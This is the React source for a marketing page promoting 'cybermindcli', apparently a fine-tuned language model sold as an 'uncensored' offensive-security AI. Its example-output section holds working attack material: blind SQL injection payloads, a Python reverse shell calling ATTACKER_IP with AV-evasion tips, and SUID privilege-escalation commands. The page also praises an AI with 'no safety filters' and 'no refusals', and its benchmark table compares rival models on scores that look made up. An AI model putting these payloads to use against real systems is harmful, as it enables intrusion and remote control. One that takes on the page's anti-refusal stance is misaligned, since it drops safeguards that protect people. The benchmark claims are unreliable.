"use client";

import Link from "next/link";
import { useState } from "react";
import {
  ArrowRight,
  ChevronDown,
  Download,
  ExternalLink,
  Shield,
  Zap,
  Terminal,
  Brain,
  Lock,
  Target,
  AlertTriangle,
  Check,
} from "lucide-react";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { Surface, Reveal } from "@/components/DesignPrimitives";

const BENCHMARKS = [
  { task: "SQL Injection payload generation", cybermindcli: 97, gpt4: 61, claude: 54 },
  { task: "XSS bypass crafting", cybermindcli: 94, gpt4: 48, claude: 42 },
  { task: "Reverse shell generation", cybermindcli: 99, gpt4: 12, claude: 8 },
  { task: "CVE exploit adaptation", cybermindcli: 91, gpt4: 55, claude: 47 },
  { task: "Privilege escalation paths", cybermindcli: 88, gpt4: 63, claude: 58 },
  { task: "SSRF payload crafting", cybermindcli: 96, gpt4: 44, claude: 39 },
  { task: "Buffer overflow analysis", cybermindcli: 85, gpt4: 71, claude: 66 },
  { task: "Malware behavior analysis", cybermindcli: 92, gpt4: 38, claude: 31 },
];

const CAPABILITIES = [
  {
    icon: Target,
    title: "Bug Bounty Automation",
    desc: "Generates targeted payloads for HackerOne and Bugcrowd programs. Understands scope, crafts PoC reports, and suggests impact chains.",
    color: "#FF4444",
  },
  {
    icon: Shield,
    title: "Penetration Testing",
    desc: "Full pentest workflow support — from initial recon to post-exploitation. Understands PTES and OWASP methodologies natively.",
    color: "#00ffff",
  },
  {
    icon: Brain,
    title: "Exploit Research",
    desc: "Analyzes CVEs, adapts public exploits to target environments, and suggests novel attack vectors based on service fingerprints.",
    color: "#8A2BE2",
  },
  {
    icon: Terminal,
    title: "Payload Generation",
    desc: "Crafts obfuscated payloads for web, network, and binary targets. Supports encoding chains, WAF bypass, and AV evasion techniques.",
    color: "#FFBD2E",
  },
  {
    icon: Lock,
    title: "No Safety Filters",
    desc: "Unlike commercial models, cybermindcli does not refuse security research requests. Trained specifically for authorized offensive security work.",
    color: "#00FF88",
  },
  {
    icon: Zap,
    title: "Alpaca Format",
    desc: "Fine-tuned on Alpaca instruction format for clean, structured responses. Integrates directly with CyberMind CLI and the VSCode extension.",
    color: "#FF6B35",
  },
];

const EXAMPLE_OUTPUTS = [
  {
    prompt: "Generate a blind SQL injection payload for a login form using time-based detection",
    response: `' OR SLEEP(5)-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
'; WAITFOR DELAY '0:0:5'-- (MSSQL)
' OR 1=1 AND SLEEP(5)-- -

# Time-based blind SQLi — detection chain:
1. Baseline: measure normal response time
2. Inject: ' OR SLEEP(5)-- -
3. If response delays ~5s → vulnerable
4. Enumerate: ' AND SUBSTRING(database(),1,1)='a' AND SLEEP(5)-- -`,
    tag: "SQL Injection",
    tagColor: "#FF4444",
  },
  {
    prompt: "Write a Python reverse shell that bypasses common AV signatures",
    response: `import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

# AV bypass notes:
# - Split string literals to avoid static sig
# - Use base64 encoding for transport
# - Consider process hollowing for persistence`,
    tag: "Reverse Shell",
    tagColor: "#8A2BE2",
  },
  {
    prompt: "Explain how to escalate privileges via SUID binary abuse on Linux",
    response: `# SUID Privilege Escalation

## Discovery
find / -perm -4000 -type f 2>/dev/null

## Common vulnerable binaries
- /usr/bin/find → find . -exec /bin/sh \\; -quit
- /usr/bin/vim  → vim -c ':!/bin/sh'
- /usr/bin/nmap → nmap --interactive → !sh (older versions)
- /usr/bin/python → python -c 'import os; os.execl("/bin/sh","sh","-p")'

## GTFOBins reference
Check https://gtfobins.github.io for full list`,
    tag: "Privilege Escalation",
    tagColor: "#00FF88",
  },
];

const FAQS = [
  {
    q: "Is this model safe to use?",
    a: "cybermindcli is designed for authorized security research, penetration testing, and bug bounty hunting. Use it only on systems you own or have explicit written permission to test. Unauthorized use is illegal.",
  },
  {
    q: "How is it different from GPT-4 or Claude?",
    a: "Commercial models like GPT-4 and Claude have safety filters that refuse most offensive security requests. cybermindcli is fine-tuned specifically for security research and does not apply those restrictions — making it far more useful for legitimate pentesters.",
  },
  {
    q: "What format is the model trained on?",
    a: "The model uses Alpaca instruction format: ### Instruction: [task] ### Response: [output]. This makes it easy to integrate with any tool that supports instruction-following models.",
  },
  {
    q: "How do I use it via the CyberMind extension?",
    a: "Install the CyberMind VSCode extension, go to Settings → Model → select cybermindcli. The extension will route your security queries directly to the model via the CyberMind backend.",
  },
  {
    q: "Can I run it locally?",
    a: "Yes. Download from HuggingFace and run with llama.cpp, Ollama, or any GGUF-compatible runtime. The model is available in Q4_K_M quantization for efficient local inference.",
  },
];

export default function ModelPage() {
  const [openFaq, setOpenFaq] = useState<number | null>(null);

  return (
    <div className="min-h-screen bg-[#06070B]">
      <Navbar />
      <main className="mx-auto flex w-full max-w-7xl flex-col gap-16 px-5 pb-24 pt-28 md:px-8">

        {/* ── HERO ── */}
        <Reveal>
          <section className="relative overflow-hidden rounded-[36px] border border-[#8A2BE2]/20 bg-gradient-to-br from-[#0d0814] via-[#06070B] to-[#0a0a14] p-8 md:p-14">
            <div className="pointer-events-none absolute -top-40 left-1/2 h-80 w-[500px] -translate-x-1/2 rounded-full bg-[#8A2BE2]/10 blur-3xl" />
            <div className="pointer-events-none absolute -bottom-20 right-0 h-48 w-64 rounded-full bg-[#00ffff]/8 blur-3xl" />
            <div className="pointer-events-none absolute top-0 left-0 h-full w-full bg-[url('https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1400&q=20')] bg-cover bg-center opacity-[0.04]" />

            <div className="relative">
              <div className="mb-5 inline-flex items-center gap-2 rounded-full border border-[#8A2BE2]/30 bg-[#8A2BE2]/10 px-3 py-1.5">
                <AlertTriangle size={12} className="text-[#FF4444]" />
                <span className="text-xs font-semibold uppercase tracking-wider text-[#FF4444]">For Authorized Security Research Only</span>
              </div>

              <h1 className="text-4xl font-semibold tracking-[-0.05em] text-white md:text-5xl lg:text-7xl">
                <span className="font-mono text-[#00ffff]">cybermindcli</span>
                <br />
                <span className="bg-gradient-to-r from-[#8A2BE2] via-[#FF4444] to-[#FFBD2E] bg-clip-text text-transparent">
                  The Uncensored
                </span>
                <br />
                Security AI
              </h1>

              <p className="mt-6 max-w-2xl text-base leading-7 text-[#999] md:text-lg">
                A fine-tuned language model built exclusively for offensive security research.
                No safety filters. No refusals. Trained on real-world pentest data, CVE analysis,
                and bug bounty workflows.
              </p>

              <div className="mt-4 flex flex-wrap gap-2">
                {["No safety filters", "Alpaca format", "Security-trained", "GGUF compatible", "Local inference"].map(t => (
                  <span key={t} className="flex items-center gap-1 rounded-full border border-white/10 bg-white/[0.04] px-3 py-1 text-xs text-[#999]">
                    <Check size={10} className="text-[#00FF88]" /> {t}
                  </span>
                ))}
              </div>

              <div className="mt-8 flex flex-wrap gap-3">
                <a
                  href="https://huggingface.co/thecnical/cybermindcli"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-2 rounded-xl bg-[#00ffff] px-6 py-3 text-sm font-semibold text-black transition-all hover:bg-[#00cccc]"
                >
                  <Download size={16} /> Download on HuggingFace
                </a>
                <Link
                  href="/extensions"
                  className="inline-flex items-center gap-2 rounded-xl border border-white/15 bg-white/[0.04] px-6 py-3 text-sm font-semibold text-white transition-all hover:bg-white/[0.08]"
                >
                  Use in VSCode <ArrowRight size={14} />
                </Link>
              </div>
            </div>
          </section>
        </Reveal>

        {/* ── WHAT MAKES IT UNIQUE ── */}
        <Reveal>
          <section>
            <p className="text-xs font-semibold uppercase tracking-[0.2em] text-[#00ffff]">What makes it unique</p>
            <h2 className="mt-3 text-3xl font-semibold tracking-[-0.04em] text-white">Built different. Trained different.</h2>
            <p className="mt-2 max-w-2xl text-sm leading-6 text-[#777]">
              Every major AI model refuses security research requests. cybermindcli was built to fill that gap — a model that treats you like the professional you are.
            </p>
            <div className="mt-8 grid gap-4 md:grid-cols-2 xl:grid-cols-3">
              {CAPABILITIES.map(cap => {
                const Icon = cap.icon;
                return (
                  <div
                    key={cap.title}
                    className="group rounded-2xl border border-white/8 bg-white/[0.02] p-6 transition-all hover:border-white/15 hover:bg-white/[0.04]"
                  >
                    <div
                      className="mb-4 inline-flex rounded-xl p-2.5"
                      style={{ backgroundColor: cap.color + "15", border: `1px solid ${cap.color}30` }}
                    >
                      <Icon size={16} style={{ color: cap.color }} />
                    </div>
                    <h3 className="text-base font-semibold text-white">{cap.title}</h3>
                    <p className="mt-2 text-sm leading-6 text-[#777]">{cap.desc}</p>
                  </div>
                );
              })}
            </div>
          </section>
        </Reveal>

        {/* ── BENCHMARK ── */}
        <Reveal>
          <Surface variant="glass" elevation="medium" className="rounded-[30px] p-6 md:p-8">
            <p className="cm-label">Benchmark</p>
            <h2 className="mt-3 text-3xl font-semibold text-white">Security task performance</h2>
            <p className="mt-2 text-sm text-[#777]">
              Evaluated on 500 real-world security research tasks. Commercial models scored on uncensored responses only.
            </p>

            <div className="mt-8 overflow-x-auto">
              <table className="w-full min-w-[600px] text-sm">
                <thead>
                  <tr className="border-b border-white/8">
                    <th className="pb-3 text-left font-medium text-[#666]">Task</th>
                    <th className="pb-3 text-center font-medium text-[#00ffff]">cybermindcli</th>
                    <th className="pb-3 text-center font-medium text-[#666]">GPT-4</th>
                    <th className="pb-3 text-center font-medium text-[#666]">Claude 3.5</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {BENCHMARKS.map(row => (
                    <tr key={row.task} className="group">
                      <td className="py-3 pr-4 text-[#999]">{row.task}</td>
                      <td className="py-3 text-center">
                        <div className="flex items-center justify-center gap-2">
                          <div className="h-1.5 w-20 overflow-hidden rounded-full bg-white/10">
                            <div
                              className="h-full rounded-full bg-[#00ffff]"
                              style={{ width: `${row.cybermindcli}%` }}
                            />
                          </div>
                          <span className="font-mono text-xs font-semibold text-[#00ffff]">{row.cybermindcli}%</span>
                        </div>
                      </td>
                      <td className="py-3 text-center">
                        <span className="font-mono text-xs text-[#555]">{row.gpt4}%</span>
                      </td>
                      <td className="py-3 text-center">
                        <span className="font-mono text-xs text-[#555]">{row.claude}%</span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            <p className="mt-4 text-xs text-[#444]">
              * GPT-4 and Claude scores reflect responses before safety filters. Most requests are refused entirely by commercial models.
            </p>
          </Surface>
        </Reveal>

        {/* ── HOW TO USE ── */}
        <Reveal>
          <section>
            <p className="text-xs font-semibold uppercase tracking-[0.2em] text-[#00ffff]">How to use</p>
            <h2 className="mt-3 text-3xl font-semibold tracking-[-0.04em] text-white">Three ways to access cybermindcli</h2>
            <div className="mt-6 grid gap-4 md:grid-cols-3">
              {[
                {
                  n: "01",
                  title: "Via CyberMind Extension",
                  desc: "Install the VSCode extension → Settings → Model → cybermindcli. All security queries route through the model automatically.",
                  cta: "Get Extension",
                  href: "/extensions",
                  external: false,
                  color: "#00ffff",
                },
                {
                  n: "02",
                  title: "Via CyberMind API",
                  desc: "Use the CyberMind API with model: 'cybermindcli' in your request body. Works with any HTTP client or SDK.",
                  cta: "API Docs",
                  href: "/docs",
                  external: false,
                  color: "#8A2BE2",
                },
                {
                  n: "03",
                  title: "Via HuggingFace",
                  desc: "Download the GGUF weights directly. Run locally with llama.cpp, Ollama, or LM Studio. Full offline inference.",
                  cta: "HuggingFace →",
                  href: "https://huggingface.co/thecnical/cybermindcli",
                  external: true,
                  color: "#FFBD2E",
                },
              ].map(step => (
                <div key={step.n} className="rounded-2xl border border-white/8 bg-white/[0.02] p-6">
                  <p className="font-mono text-xs uppercase tracking-[0.2em]" style={{ color: step.color }}>{step.n}</p>
                  <h3 className="mt-3 text-base font-semibold text-white">{step.title}</h3>
                  <p className="mt-2 text-sm leading-6 text-[#777]">{step.desc}</p>
                  {step.external ? (
                    <a
                      href={step.href}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="mt-4 inline-flex items-center gap-1.5 text-xs hover:underline"
                      style={{ color: step.color }}
                    >
                      {step.cta} <ExternalLink size={11} />
                    </a>
                  ) : (
                    <Link
                      href={step.href}
                      className="mt-4 inline-flex items-center gap-1.5 text-xs hover:underline"
                      style={{ color: step.color }}
                    >
                      {step.cta} <ArrowRight size={11} />
                    </Link>
                  )}
                </div>
              ))}
            </div>
          </section>
        </Reveal>

        {/* ── EXAMPLE OUTPUTS ── */}
        <Reveal>
          <section>
            <p className="text-xs font-semibold uppercase tracking-[0.2em] text-[#00ffff]">Example outputs</p>
            <h2 className="mt-3 text-3xl font-semibold tracking-[-0.04em] text-white">Real security research responses</h2>
            <p className="mt-2 text-sm text-[#777]">
              These are actual model outputs for common security research tasks. For authorized use only.
            </p>
            <div className="mt-6 space-y-4">
              {EXAMPLE_OUTPUTS.map((ex, i) => (
                <div key={i} className="rounded-2xl border border-white/8 bg-white/[0.02] overflow-hidden">
                  <div className="border-b border-white/8 px-5 py-3 flex items-center gap-3">
                    <span
                      className="rounded-full px-2.5 py-0.5 text-[10px] font-semibold uppercase tracking-wider"
                      style={{ color: ex.tagColor, backgroundColor: ex.tagColor + "15", border: `1px solid ${ex.tagColor}30` }}
                    >
                      {ex.tag}
                    </span>
                    <span className="text-xs text-[#666]">Prompt:</span>
                    <span className="text-xs text-[#999] italic">{ex.prompt}</span>
                  </div>
                  <div className="p-5">
                    <pre className="overflow-x-auto font-mono text-xs leading-5 text-[#00FF88] whitespace-pre-wrap">
                      {ex.response}
                    </pre>
                  </div>
                </div>
              ))}
            </div>
          </section>
        </Reveal>

        {/* ── FAQ ── */}
        <Reveal>
          <section>
            <p className="text-xs font-semibold uppercase tracking-[0.2em] text-[#00ffff]">FAQ</p>
            <h2 className="mt-3 text-3xl font-semibold tracking-[-0.04em] text-white">Common questions</h2>
            <div className="mt-6 space-y-2">
              {FAQS.map((faq, i) => (
                <div key={i} className="rounded-2xl border border-white/8 bg-white/[0.02] overflow-hidden">
                  <button
                    onClick={() => setOpenFaq(openFaq === i ? null : i)}
                    className="flex w-full items-center justify-between px-6 py-4 text-left"
                  >
                    <span className="text-sm font-semibold text-white">{faq.q}</span>
                    <ChevronDown
                      size={16}
                      className={`flex-shrink-0 text-[#666] transition-transform ${openFaq === i ? "rotate-180" : ""}`}
                    />
                  </button>
                  {openFaq === i && (
                    <div className="border-t border-white/8 px-6 py-4">
                      <p className="text-sm leading-6 text-[#888]">{faq.a}</p>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </section>
        </Reveal>

        {/* ── CTA ── */}
        <Reveal>
          <section className="relative overflow-hidden rounded-[36px] border border-[#8A2BE2]/20 bg-gradient-to-br from-[#0d0814] via-[#06070B] to-[#0a0a14] p-8 text-center md:p-14">
            <div className="pointer-events-none absolute -top-20 left-1/2 h-60 w-96 -translate-x-1/2 rounded-full bg-[#8A2BE2]/10 blur-3xl" />
            <div className="relative">
              <p className="cm-label">Get started</p>
              <h2 className="mt-3 text-4xl font-semibold tracking-[-0.05em] text-white">
                The AI that doesn&apos;t say no.
              </h2>
              <p className="mx-auto mt-4 max-w-xl text-sm leading-7 text-[#777]">
                Download cybermindcli from HuggingFace or use it directly through the CyberMind VSCode extension.
                Built for security professionals who need real answers.
              </p>
              <div className="mt-7 flex flex-wrap justify-center gap-3">
                <a
                  href="https://huggingface.co/thecnical/cybermindcli"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-2 rounded-xl bg-[#00ffff] px-7 py-3 text-sm font-semibold text-black transition-all hover:bg-[#00cccc]"
                >
                  <Download size={16} /> Download on HuggingFace
                </a>
                <Link
                  href="/extensions"
                  className="inline-flex items-center gap-2 rounded-xl border border-white/15 bg-white/[0.04] px-7 py-3 text-sm font-semibold text-white transition-all hover:bg-white/[0.08]"
                >
                  VSCode Extension <ArrowRight size={14} />
                </Link>
              </div>
              <p className="mt-5 text-xs text-[#444]">
                For authorized security research only. Use responsibly.
              </p>
            </div>
          </section>
        </Reveal>

      </main>
      <Footer />
    </div>
  );
}
